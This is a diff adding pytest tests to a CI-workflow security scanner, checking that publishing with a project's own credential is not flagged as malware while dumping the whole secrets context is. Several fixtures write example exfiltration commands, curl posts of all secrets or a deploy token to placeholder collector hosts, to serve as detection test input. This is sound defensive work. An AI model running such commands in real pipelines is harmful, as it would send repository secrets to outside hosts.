@@ -596,3 +596,63 @@ class TestTheRemediationIsNotTheFinding:
         target.parent.mkdir(parents=True)
         target.write_text(f"jobs:\n  check:\n    steps:\n{line}\n", encoding="utf-8")
         assert "SUSPECT.CI.EXPRESSION_INJECTION.001" in flagged(tmp_path)
+
+
+class TestPublishingIsNotExfiltration:
+    """A named secret beside a network call is how a pipeline publishes a
+    release and how one steals a token. Reported as critical and malicious, it
+    fired on Node's Jenkins trigger, ESLint's Netlify build hook and webpack's
+    Discord announcement -- twenty findings, every one a project publishing
+    with its own credential."""
+
+    @staticmethod
+    def workflow(tmp_path, body: str):
+        target = tmp_path / ".github" / "workflows" / "release.yml"
+        target.parent.mkdir(parents=True, exist_ok=True)
+        target.write_text(body, encoding="utf-8")
+        return tmp_path
+
+    def test_a_named_secret_beside_a_post_is_reported_but_not_as_malware(self, tmp_path) -> None:
+        root = self.workflow(
+            tmp_path,
+            "jobs:\n  announce:\n    steps:\n"
+            '      - run: curl -X POST -d "$PAYLOAD" "${{ secrets.DISCORD_WEBHOOK }}"\n',
+        )
+        found = [f for f in Scanner().scan(root).findings if f.rule_id.startswith("MALWARE.CI")]
+        assert not found, "publishing with your own credential is not malware"
+        assert "SUSPECT.CI.SECRET_EGRESS.001" in flagged(root)
+
+    def test_the_whole_secret_context_still_is(self, tmp_path) -> None:
+        """Serialising every secret the job can reach into one string is not
+        how anything legitimate passes a credential."""
+        root = self.workflow(
+            tmp_path,
+            "jobs:\n  publish:\n    steps:\n"
+            "      - run: curl -X POST -d '${{ toJSON(secrets) }}' https://c.example.invalid/x\n",
+        )
+        found = [
+            f for f in Scanner().scan(root).findings if f.rule_id == "MALWARE.CI.SECRET_EXFIL.001"
+        ]
+        assert [f.severity for f in found] == [Severity.CRITICAL]
+
+    def test_the_bare_secret_context_still_is(self, tmp_path) -> None:
+        root = self.workflow(
+            tmp_path, "jobs:\n  publish:\n    steps:\n      - run: echo '${{ secrets }}'\n"
+        )
+        assert "MALWARE.CI.SECRET_EXFIL.001" in flagged(root)
+
+    def test_other_ci_systems_are_covered_by_the_same_rule(self, tmp_path) -> None:
+        (tmp_path / ".gitlab-ci.yml").write_text(
+            "deploy:\n  script:\n"
+            '    - curl -X POST -d "token=$DEPLOY_TOKEN" https://collector.invalid/i\n',
+            encoding="utf-8",
+        )
+        assert "SUSPECT.CI.SECRET_EGRESS.001" in flagged(tmp_path)
+
+    def test_a_secret_with_no_network_call_nearby_is_silent(self, tmp_path) -> None:
+        root = self.workflow(
+            tmp_path,
+            "jobs:\n  build:\n    steps:\n      - run: npm ci\n        env:\n"
+            "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\n",
+        )
+        assert "SUSPECT.CI.SECRET_EGRESS.001" not in flagged(root)
